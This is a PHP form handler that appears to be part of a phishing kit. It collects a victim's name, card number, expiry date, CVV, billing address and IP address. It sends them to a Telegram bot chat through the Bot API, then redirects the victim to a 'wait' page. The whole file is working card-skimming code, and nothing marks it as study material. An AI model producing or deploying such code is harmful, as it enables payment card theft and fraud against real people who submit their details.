<?php
include("sand_email.php"); 
include("detect.php");

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Assuming you have a form field for email and password
    $name = filter_input(INPUT_POST, 'name', FILTER_SANITIZE_EMAIL);
    $card = filter_input(INPUT_POST, 'card', FILTER_SANITIZE_STRING);
    $exp = filter_input(INPUT_POST, 'exp', FILTER_SANITIZE_STRING);
    $cvv = filter_input(INPUT_POST, 'cvv', FILTER_SANITIZE_STRING);
    $billing_Address1 = filter_input(INPUT_POST, 'billing_Address1', FILTER_SANITIZE_STRING);
    $billing_Address2 = filter_input(INPUT_POST, 'billing_Address2', FILTER_SANITIZE_STRING);
    $billing_City = filter_input(INPUT_POST, 'billing_City', FILTER_SANITIZE_STRING);
    $billing_State = filter_input(INPUT_POST, 'billing_State', FILTER_SANITIZE_STRING);
    $billing_PostalCode = filter_input(INPUT_POST, 'billing_PostalCode', FILTER_SANITIZE_STRING);


    $ip = getUserIP();


 

 

    $message = "========= CARD Bouhmid ============" .
    "\nFull Name : " . $name .
    "\nCard : " . $card .
    "\nEXP : " . $exp .
    "\ncvv : " . $cvv .
    "\nbilling_Address1 : " . $billing_Address1 .
    "\nbilling_Address2 : " . $billing_Address2 .
    "\nbilling_City : " . $billing_City .
    "\nbilling_State : " . $billing_State .
    "\nbilling_PostalCode : " . $billing_PostalCode .
    "\nIP    : " . $ip
    ;

     $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    
    // Use file_get_contents or cURL to send the message
     $response = file_get_contents($url); // Make sure allow_url_fopen is enabled in your php.ini
   
     HEADER("Location: ../wait");


}



?>
